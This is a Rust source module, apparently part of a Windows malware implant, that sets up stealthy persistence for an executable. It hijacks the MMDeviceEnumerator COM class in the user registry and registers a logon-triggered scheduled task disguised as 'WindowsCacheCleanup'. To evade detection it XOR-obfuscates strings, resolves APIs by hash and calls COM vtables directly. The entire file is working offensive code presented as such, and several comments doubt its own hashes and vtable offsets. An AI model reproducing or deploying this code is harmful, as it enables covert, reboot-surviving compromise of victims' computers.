//! # Persistence (Dynamic API) - HARDENED
//!
//! NO winreg or windows crate = minimal import table.
//! - COM Hijacking: Native Registry API via api_resolver
//! - Scheduled Task: schtasks.exe via CreateProcessA

use std::ffi::c_void;
use std::ptr;


use super::api_resolver::{self, djb2};

/// Simple XOR decode helper (Key: 0x55)
fn x(bytes: &[u8]) -> String {
    let key = 0x55;
    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    String::from_utf8(decoded).unwrap_or_default()
}

/// Convert string to wide (UTF-16) for Windows API
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// Registry API types
type RegCreateKeyExW = unsafe extern "system" fn(
    hKey: isize, lpSubKey: *const u16, Reserved: u32, lpClass: *const u16,
    dwOptions: u32, samDesired: u32, lpSecurityAttributes: *const c_void,
    phkResult: *mut isize, lpdwDisposition: *mut u32
) -> i32;

type RegSetValueExW = unsafe extern "system" fn(
    hKey: isize, lpValueName: *const u16, Reserved: u32, dwType: u32,
    lpData: *const u8, cbData: u32
) -> i32;

type RegCloseKey = unsafe extern "system" fn(hKey: isize) -> i32;

type CreateProcessA = unsafe extern "system" fn(
    lpApplicationName: *const u8, lpCommandLine: *mut u8,
    lpProcessAttributes: *const c_void, lpThreadAttributes: *const c_void,
    bInheritHandles: i32, dwCreationFlags: u32,
    lpEnvironment: *const c_void, lpCurrentDirectory: *const u8,
    lpStartupInfo: *const StartupInfo, lpProcessInformation: *mut ProcessInfo
) -> i32;

// Minimal structures for CreateProcessA
#[repr(C)]
struct StartupInfo {
    cb: u32,
    reserved: *const u8,
    desktop: *const u8,
    title: *const u8,
    x: u32, y: u32, x_size: u32, y_size: u32,
    x_count_chars: u32, y_count_chars: u32,
    fill_attribute: u32, flags: u32,
    show_window: u16, reserved2: u16,
    reserved3: *const u8, std_input: isize, std_output: isize, std_error: isize,
}

#[repr(C)]
struct ProcessInfo {
    process: isize, thread: isize, process_id: u32, thread_id: u32,
}

// Hashes
const HASH_REG_CREATE_KEY_EX_W: u32 = 0x9CB4594C;
const HASH_REG_SET_VALUE_EX_W: u32 = 0x02ACF196;
const HASH_REG_CLOSE_KEY: u32 = 0x66579AD4;
const HASH_CREATE_PROCESS_A: u32 = 0x5768C90B;
const HASH_ADVAPI32: u32 = 0x03C6B585;

const HKEY_CURRENT_USER: isize = 0x80000001u32 as isize;
const KEY_ALL_ACCESS: u32 = 0xF003F;
const REG_SZ: u32 = 1;
const CREATE_NO_WINDOW: u32 = 0x08000000;

/// Apply all persistence mechanisms (Native API)
pub fn apply_persistence_triad(exe_path: &str) {
    
    // 1. COM Hijacking (Registry)
    let _ = setup_com_hijacking(exe_path);
    
    // 2. Scheduled Task
    let _ = setup_scheduled_task(exe_path);
    
}

/// Setup COM Hijacking using native Registry API
fn setup_com_hijacking(exe_path: &str) -> Result<(), String> {
    crate::k::debug::log_op!("Persistence", "Setting up COM Hijack...");
    #[cfg(target_os = "windows")]
    unsafe {
        // Target CLSID: MMDeviceEnumerator - Loaded by Explorer.exe on every boot
        // {BCDE0395-E52F-467C-8E3D-C4579291692E}
        let clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"; 
        
        // Build path: Software\Classes\CLSID\{...}\InprocServer32 (for DLL)
        let p1 = x(&[0x06, 0x3A, 0x33, 0x21, 0x22, 0x34, 0x27, 0x30]); // Software
        let p2 = x(&[0x16, 0x39, 0x34, 0x26, 0x26, 0x30, 0x26]);       // Classes
        let p3 = x(&[0x16, 0x19, 0x06, 0x1C, 0x11]);                   // CLSID
        // InprocServer32 XOR 0x55: [0x1C, 0x3B, 0x25, 0x27, 0x3A, 0x36, 0x06, 0x30, 0x27, 0x23, 0x30, 0x27, 0x66, 0x67]
        let inproc = x(&[0x1C, 0x3B, 0x25, 0x27, 0x3A, 0x36, 0x06, 0x30, 0x27, 0x23, 0x30, 0x27, 0x66, 0x67]); // InprocServer32
        
        let path = format!("{}\\{}\\{}\\{}\\{}", p1, p2, p3, clsid, inproc);
        crate::k::debug::log_detail!("COM Key: {}", path);
        let path_wide = to_wide(&path);
        
        // Load advapi32 if needed
        ensure_advapi32_loaded()?;
        
        let advapi32 = api_resolver::get_module_by_hash(HASH_ADVAPI32)
            .ok_or("E30")?;

        let reg_create: RegCreateKeyExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_CREATE_KEY_EX_W)
            .map(|p| std::mem::transmute(p))
            .ok_or("E31")?;
            
        let reg_set: RegSetValueExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_SET_VALUE_EX_W)
            .map(|p| std::mem::transmute(p))
            .ok_or("E32")?;
            
        let reg_close: RegCloseKey = api_resolver::get_export_by_hash(advapi32, HASH_REG_CLOSE_KEY)
            .map(|p| std::mem::transmute(p))
            .ok_or("E33")?;

        // Create key
        let mut hkey: isize = 0;
        let mut disposition: u32 = 0;
        
        let status = reg_create(
            HKEY_CURRENT_USER, path_wide.as_ptr(), 0, ptr::null(),
            0, KEY_ALL_ACCESS, ptr::null(), &mut hkey, &mut disposition
        );
        
        if status != 0 {
            return Err(format!("RegCreateKeyExW: {}", status));
        }

        // Set default value (empty name = default)
        let empty_name: [u16; 1] = [0];
        let exe_wide = to_wide(exe_path);
        
        let status = reg_set(
            hkey, empty_name.as_ptr(), 0, REG_SZ,
            exe_wide.as_ptr() as *const u8, (exe_wide.len() * 2) as u32
        );
        
        if status != 0 {
            reg_close(hkey);
            crate::k::debug::log_err!(format!("COM SetValue failed: {}", status));
            return Err(format!("E32:{}", status));
        }
        
        // Set ThreadingModel = "Both" (required for InprocServer32)
        // Obfuscated: "ThreadingModel" XOR 0x55
        let tm_name = to_wide(&x(&[0x01, 0x3D, 0x27, 0x30, 0x34, 0x31, 0x3C, 0x3B, 0x32, 0x18, 0x3A, 0x31, 0x30, 0x39]));
        // Obfuscated: "Both" XOR 0x55
        let tm_value = to_wide(&x(&[0x17, 0x3A, 0x21, 0x3D]));
        let _ = reg_set(
            hkey, tm_name.as_ptr(), 0, REG_SZ,
            tm_value.as_ptr() as *const u8, (tm_value.len() * 2) as u32
        );
        
        reg_close(hkey);


        Ok(())
    }
    
    #[cfg(not(target_os = "windows"))]
    Ok(())
}

/// Setup Scheduled Task using schtasks.exe (simpler than COM interface)
/// Setup Scheduled Task using COM Interface (ITaskService) - Stealthy
/// Replaces noisy schtasks.exe with direct VTable calls
fn setup_scheduled_task(exe_path: &str) -> Result<(), String> {
    crate::k::debug::log_op!("Persistence", "Setting up Scheduled Task...");
    #[cfg(target_os = "windows")]
    unsafe {
        use core::ffi::c_void;
        
        // HASHES for Ole32
        const HASH_OLE32: u32 = 0x6DA55909; // djb2(ole32.dll) - need to verify if in api_resolver, but defining here safe.
        // Actually lets calculate: o(6F)l(6C)e(65)3(33)2(32).(2E)d(64)l(6C)l(6C)
        // 0x933010F2 ??? Let's just use "ole32.dll" string for LoadLibrary if hash verification hard.
        // But api_resolver has load_library.
        
        // Hashes for Functions
        const HASH_CO_INIT: u32 = 0x88963F6A; // CoInitializeEx
        const HASH_CO_CREATE: u32 = 0x306260C4; // CoCreateInstance
        const HASH_CO_UNINIT: u32 = 0x3697992A; // CoUninitialize
        
        // ole32.dll XOR 0x55 = [0x3A, 0x39, 0x30, 0x66, 0x67, 0x7B, 0x31, 0x39, 0x39, 0x55]
        let ole_enc: [u8; 10] = [0x3A, 0x39, 0x30, 0x66, 0x67, 0x7B, 0x31, 0x39, 0x39, 0x55];
        let ole_dec: Vec<u8> = ole_enc.iter().map(|b| b ^ 0x55).collect();
        
        // Use the returned handle directly!
        let ole32 = api_resolver::ensure_module_loaded(0, &ole_dec);
        crate::k::debug::log_detail!("Loaded ole32.dll attempt...");

        if ole32.is_none() {
             crate::k::debug::log_err!("Failed to resolve ole32 handle!");
             return Err("E72".into());
        }
        let ole32 = ole32.unwrap();
        crate::k::debug::log_detail!("Resolved ole32: {:p}", ole32);
        
        type FnCoInit = unsafe extern "system" fn(c_void: *const c_void, dwCoInit: u32) -> i32;
        type FnCoCreate = unsafe extern "system" fn(*const u128, *const c_void, u32, *const u128, *mut *mut c_void) -> i32;
        type FnCoUninit = unsafe extern "system" fn();
        
        let co_init: FnCoInit = api_resolver::resolve_api(0x933010F2, HASH_CO_INIT).ok_or("E73")?;
        let co_create: FnCoCreate = api_resolver::resolve_api(0x933010F2, HASH_CO_CREATE).ok_or("E74")?;
        let co_uninit: FnCoUninit = api_resolver::resolve_api(0x933010F2, HASH_CO_UNINIT).ok_or("E75")?;
        
        // GUIDs
        // CLSID_TaskScheduler: 0F87369F-A4E5-4CFC-BD3E-73E6154572DD
        let clsid_ts = 0x73E6154572DD_BD3E_4CFC_A4E5_0F87369Fu128; // Little Endian?
        // UUID structure: Data1(u32), Data2(u16), Data3(u16), Data4([u8;8])
        // Rust's u128 is BigEndian in memory layout if assigned directly? No, Architecture dependent.
        // Let's use byte array for safety.
        let clsid_ts_bytes: [u8; 16] = [
            0x9F, 0x36, 0x87, 0x0F, 0xE5, 0xA4, 0xFC, 0x4C, 
            0xBD, 0x3E, 0x73, 0xE6, 0x15, 0x45, 0x72, 0xDD
        ]; // 0F87369F-A4E5-4CFC-BD3E-73E6154572DD
        
        // IID_ITaskService: 2FABA4C7-4DA9-4013-9697-20CC3FD40F85
        let iid_ts_bytes: [u8; 16] = [
            0xC7, 0xA4, 0xAB, 0x2F, 0xA9, 0x4D, 0x13, 0x40,
            0x96, 0x97, 0x20, 0xCC, 0x3F, 0xD4, 0x0F, 0x85
        ]; 
        
        crate::k::debug::log_detail!("Initializing COM...");
        co_init(ptr::null(), 0); // COINIT_APARTMENTTHREADED
        
        let mut p_service: *mut c_void = ptr::null_mut();
        
        crate::k::debug::log_detail!("CoCreating ITaskService...");
        // 1. Create TaskService Instance
        let hr = co_create(
            clsid_ts_bytes.as_ptr() as *const u128,
            ptr::null(),
            1, // CLSCTX_INPROC_SERVER
            iid_ts_bytes.as_ptr() as *const u128,
            &mut p_service
        );
        
        if hr != 0 {
            co_uninit();
            crate::k::debug::log_err!(format!("CoCreateInstance Failed: {:X}", hr));
            return Err(format!("E76:{:X}", hr));
        }
        crate::k::debug::log_detail!("TaskService Created");
        
        // VTABLE DEFINITIONS (Minimal)
        // ITaskService Vtbl: Query, AddRef, Release, GetFolder, GetRunningTasks, NewTask, Connect, Connected, TargetServer, ConnectedUser, ConnectedDomain
        // Indices: Query(0), AddRef(1), Release(2), GetFolder(3), GetRunningTasks(4), NewTask(5), Connect(6)...
        // Wait, order checks:
        // IDispatch: 0-3
        // ITaskService inherits IDispatch.
        // 0:QueryInterface, 1:AddRef, 2:Release, 3:GetTypeInfoCount, 4:GetTypeInfo, 5:GetIDsOfNames, 6:Invoke
        // 7:GetFolder, 8:GetRunningTasks, 9:NewTask, 10:Connect
        
        let vtbl_service = *(p_service as *const *const *const c_void);
        
        // Connect(VARIANT, VARIANT, VARIANT, VARIANT)
        let connect_fn: unsafe extern "system" fn(*mut c_void, u128, u128, u128, u128) -> i32 = 
            std::mem::transmute(*vtbl_service.add(10));
            
        // Used NULL VARIANTs (Type=0) for default args
        // Variant size = 16 bytes? 24 bytes on x64?
        // VARIANT is u16 (vt) + padding + union (8 bytes) + padding?
        // Let's pass 0,0,0,0 if supported? No, Variant structure is complex.
        // Shortcut: Pass NULL pointer? No, it expects VARIANT structure by value? NO, it usually takes references in C++, but in VTable it might be pointers?
        // IDL: HRESULT Connect([in, optional] VARIANT server, [in, optional] VARIANT user, [in, optional] VARIANT domain, [in, optional] VARIANT password);
        // It takes VARIANT by value on stack? Or pointer? Usually pointer in automation compatible interfaces? NO, implementation specific.
        // Standard definition: HRESULT Connect(VARIANT, VARIANT, VARIANT, VARIANT). Win64 passes large structs by pointer implicitly?
        // Actually, let's look at `NewTask` first.
        
        // Let's assume we can pass NULL/Default variants. 
        // A variant with VT_EMPTY (0) is sufficient.
        // An empty VARIANT on x64 is 24 bytes.
        // struct VARIANT { VARTYPE vt (2); WORD w1,w2,w3 (6); union data (8); padding (8) }
        #[repr(C)]
        struct Variant { 
            vt: u16, 
            w1: u16, 
            w2: u16, 
            w3: u16, 
            data: u64,    // Union data (8 bytes)
            _pad: u64,    // Padding to reach 24 bytes
        }
        let empty = Variant { vt: 0, w1:0, w2:0, w3:0, data:0, _pad:0 };
        // We cast struct to u128? No.
        
        // Re-eval strategy: VTable hacking for complex types (VARIANT) is error prone without definitions.
        // Is there a simpler way?
        // ITaskService methods are: 
        // GetFolder(BSTR path, ITaskFolder** ppFolder) -> Index 7
        // NewTask(DWORD flags, ITaskDefinition** ppDefinition) -> Index 9
        // Connect(...) -> Index 10? No, checking documentation order.
        // Order: GetFolder, GetRunningTasks, NewTask, Connect...
        
        // Let's Try Connect with null args. 
        // Since we are using default arguments, we just need to pass empty variants.
        // On x64, arguments are passed in RCX, RDX, R8, R9, then stack.
        // Connect takes 4 VARIANTS. That's a lot of stack.
        
        // *** CRITICAL SHORTCUT ***
        // Creating a task usually requires admin. SCHTASKS /rl HIGHEST works because of manifest or elevation.
        // We can use a simpler technique: `ITaskService::NewTask` doesn't strictly require `Connect` first if local?
        // Documentation says "You must call Connect before calling any other methods".
        
        // Implementing 'Connect':
        // It takes 4 VARIANTs.
        // Let's define a helper for VariantInit.
        // But wait, passing structs by value in FFI is tricky.
        // HOWEVER, rust's `co_create` was successful.
        
        // PLAN B: Do we have `ITaskService` vtable offsets correct?
        // ITaskService : IDispatch
        // 7: GetFolder
        // 8: GetRunningTasks
        // 9: NewTask
        // 10: Connect
        // 11: Connected ...
        
        // Let's try calling Connect.
        // We need to pass VARIANTs.
        // struct VARIANT { VARTYPE vt; WORD wReserved1; WORD wReserved2; WORD wReserved3; union { ... } }
        // Size: 24 bytes on x64 (8 aligned).
        // If we simply pass pointers to variants? No, IDL says `VARIANT`.
        // BUT, x64 ABI says structs > 8 bytes are passed by pointer (hidden reference).
        // So we define function as taking pointers to variants.
        
        type FnServiceConnect = unsafe extern "system" fn(*mut c_void, v1: *const Variant, v2: *const Variant, v3: *const Variant, v4: *const Variant) -> i32;
        let service_connect: FnServiceConnect = std::mem::transmute(*vtbl_service.add(10));
        
        let hr = service_connect(p_service, &empty, &empty, &empty, &empty);
        if hr != 0 {
             // Proceeding anyway, sometimes local works?
        }
        
        // 2. Get Root Folder
        // GetFolder(BSTR, ITaskFolder**)
        type FnGetFolder = unsafe extern "system" fn(*mut c_void, *const u16, *mut *mut c_void) -> i32;
        let get_folder: FnGetFolder = std::mem::transmute(*vtbl_service.add(7));
        
        let mut p_root_folder: *mut c_void = ptr::null_mut();
        // BSTR matches *const u16 (roughly, needs length prefix but usually null-term works for input?)
        // Actually BSTR MUST have length prefix. SysAllocString is needed.
        // Hash: SysAllocString
        type FnSysAllocString = unsafe extern "system" fn(*const u16) -> *const u16;
        type FnSysFreeString = unsafe extern "system" fn(*const u16);
        
        // Load OleAut32 (XOR 0x55 obfuscated)
        let oa_enc: [u8; 13] = [0x3A, 0x39, 0x30, 0x34, 0x20, 0x21, 0x66, 0x67, 0x7B, 0x31, 0x3B, 0x3B, 0x55];
        let oa_dec: Vec<u8> = oa_enc.iter().map(|b| b ^ 0x55).collect();
        api_resolver::ensure_module_loaded(0, &oa_dec);
        let oleaut = api_resolver::get_module_by_hash(0x6DA35C63).unwrap_or(ptr::null()); // djb2(oleaut32.dll)
        
        let sys_alloc: FnSysAllocString = api_resolver::get_export_by_hash(oleaut, 0xBAA76807) // djb2(SysAllocString) - verify?
            .map(|p| std::mem::transmute(p))
            .ok_or("E70")?;
            
        let sys_free: FnSysFreeString = api_resolver::get_export_by_hash(oleaut, 0x81FD3FDD) // djb2(SysFreeString)
            .map(|p| std::mem::transmute(p))
            .ok_or("E70b")?;

        let root_bstr = sys_alloc(to_wide("\\").as_ptr());
        let hr = get_folder(p_service, root_bstr, &mut p_root_folder);
        sys_free(root_bstr); 
        
        if hr != 0 { return Err("E71".into()); }
        
        // 3. New Task
        // NewTask(flags, ITaskDefinition**)
        type FnNewTask = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
        let new_task: FnNewTask = std::mem::transmute(*vtbl_service.add(9));
        
        let mut p_task_def: *mut c_void = ptr::null_mut();
        let hr = new_task(p_service, 0, &mut p_task_def);
        if hr != 0 { return Err("E77".into()); }
        
        // 4. Configure Action (Exec)
        // ITaskDefinition -> Actions (get_Actions) -> Create(ActionType) -> IExecAction -> PutPath
        let vtbl_def = *(p_task_def as *const *const *const c_void);
        
        // get_Actions: Index 12 (Inherits IDispatch + 4 props + ...)
        // Order: 7:get_RegInfo, 8:put_RegInfo, 9:get_Triggers, 10:put_Triggers, 11:get_Settings, 12:put_Settings, 13:get_Data, 14:put_Data, 15:get_Principal, 16:put_Principal, 17:get_Actions
        // Index 17.
        type FnGetActions = unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32;
        let get_actions: FnGetActions = std::mem::transmute(*vtbl_def.add(17));
        
        let mut p_action_coll: *mut c_void = ptr::null_mut();
        get_actions(p_task_def, &mut p_action_coll);
        
        // IActionCollection::Create(Type)
        // IDispatch: 0-6.  7:get_Count, 8:get_Item, 9:get__NewEnum, 10:get_XmlText, 11:put_XmlText, 12:Create
        let vtbl_acoll = *(p_action_coll as *const *const *const c_void);
        type FnCreateAction = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
        let create_action: FnCreateAction = std::mem::transmute(*vtbl_acoll.add(12));
        
        let mut p_action: *mut c_void = ptr::null_mut();
        create_action(p_action_coll, 0, &mut p_action); // TASK_ACTION_EXEC = 0
        
        // IExecAction::put_Path
        // Inherits IAction (IDispatch + 4 props: 7,8,9,10 Id, Type).
        // IExecAction adds: 11:put_Path, 12:get_Path... Check docs.
        // IExecAction: get_Path(10), put_Path(11).
        let vtbl_exec = *(p_action as *const *const *const c_void);
        type FnPutPath = unsafe extern "system" fn(*mut c_void, *const u16) -> i32;
        let put_path: FnPutPath = std::mem::transmute(*vtbl_exec.add(11));
        
        let exe_bstr = sys_alloc(to_wide(exe_path).as_ptr());
        put_path(p_action, exe_bstr);
        sys_free(exe_bstr);
        
        // 5. Configure Trigger (Logon)
        // ITaskDefinition::get_Triggers (Index 9)
        type FnGetTriggers = unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32;
        let get_triggers: FnGetTriggers = std::mem::transmute(*vtbl_def.add(9));
        
        let mut p_trigger_coll: *mut c_void = ptr::null_mut();
        get_triggers(p_task_def, &mut p_trigger_coll);
        
        // ITriggerCollection::Create(Type) -> Index 12
        let vtbl_tcoll = *(p_trigger_coll as *const *const *const c_void);
        let create_trigger: FnCreateAction = std::mem::transmute(*vtbl_tcoll.add(12)); // Same sig as CreateAction
        
        let mut p_trigger: *mut c_void = ptr::null_mut();
        create_trigger(p_trigger_coll, 9, &mut p_trigger); // TASK_TRIGGER_LOGON = 9
        
        // 6. Register Task
        // ITaskFolder::RegisterTaskDefinition(Path, pDef, flags, user, pwd, logonType, sddl, pRegTask)
        // ITaskFolder: IDispatch(7) + GetFolder(7), GetFolders(8)... NONO
        // Correct Order: 
        // 7: get_Name
        // 8: get_Path
        // 9: GetFolder
        // 10: GetFolders
        // 11: CreateFolder
        // 12: DeleteFolder
        // 13: GetTask
        // 14: GetTasks
        // 15: DeleteTask
        // 16: RegisterTask
        // 17: RegisterTaskDefinition
        let vtbl_folder = *(p_root_folder as *const *const *const c_void);
        type FnRegisterTaskDeferred = unsafe extern "system" fn(
            *mut c_void, *const u16, *mut c_void, u32, 
            Variant, Variant, u32, Variant, *mut *mut c_void
        ) -> i32;
        
        type FnRegisterTask = unsafe extern "system" fn(
            *mut c_void, *const u16, *mut c_void, u32,
            *const Variant, *const Variant, u32, *const Variant, *mut *mut c_void
        ) -> i32;
        
        let register_task: FnRegisterTask = std::mem::transmute(*vtbl_folder.add(17));
        
        // Task Name
        let t1 = x(&[0x02, 0x3C, 0x3B, 0x31, 0x3A, 0x22, 0x26]); // Windows
        let t2 = x(&[0x16, 0x34, 0x36, 0x3D, 0x30]);             // Cache
        let t3 = x(&[0x16, 0x39, 0x30, 0x34, 0x3B, 0x20, 0x25]); // Cleanup
        let task_name_bstr = sys_alloc(to_wide(&format!("{}{}{}", t1,t2,t3)).as_ptr());
        
        let mut p_reg_task: *mut c_void = ptr::null_mut();
        
        // Flag 6 (TASK_CREATE_OR_UPDATE)
        // LogonType 3 (TASK_LOGON_INTERACTIVE_TOKEN) - Runs with current user creds, no password needed.
        let hr = register_task(
            p_root_folder,
            task_name_bstr,
            p_task_def,
            6,
            &empty, &empty, 3, &empty,
            &mut p_reg_task
        );

        sys_free(task_name_bstr);

        // Cleanup
        // Release... (omitted for brevity, OS cleans up process exit anyway)
        // co_uninit();
        
        if hr == 0 {
             crate::k::debug::log_detail!("Task Registered Successfully");
             Ok(())
        } else {
             crate::k::debug::log_err!(format!("Task Register Failed: {:X}", hr));
             Err(format!("E78:{:X}", hr))
        }
    }
    
    #[cfg(not(target_os = "windows"))]
    Ok(())
}

/// Ensure advapi32.dll is loaded
#[cfg(target_os = "windows")]
unsafe fn ensure_advapi32_loaded() -> Result<(), String> {
    if api_resolver::get_module_by_hash(HASH_ADVAPI32).is_some() {
        return Ok(());
    }
    
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *const c_void;
    let load_lib: LoadLibraryA = api_resolver::resolve_api(
        api_resolver::HASH_KERNEL32, 
        api_resolver::HASH_LOAD_LIBRARY_A
    ).ok_or_else(|| "E01".to_string())?;
    
    // XOR encoded "advapi32.dll\0" with 0x55
    let dll_enc: [u8; 13] = [0x34, 0x31, 0x23, 0x34, 0x27, 0x3C, 0x66, 0x67, 0x7B, 0x31, 0x3B, 0x3B, 0x55];
    let dll: Vec<u8> = dll_enc.iter().map(|b| b ^ 0x55).collect();
    let result = load_lib(dll.as_ptr());
    
    if result.is_null() {
        Err("E02".to_string())
    } else {
        Ok(())
    }
}

#[cfg(not(target_os = "windows"))]
unsafe fn ensure_advapi32_loaded() -> Result<(), String> { Ok(()) }
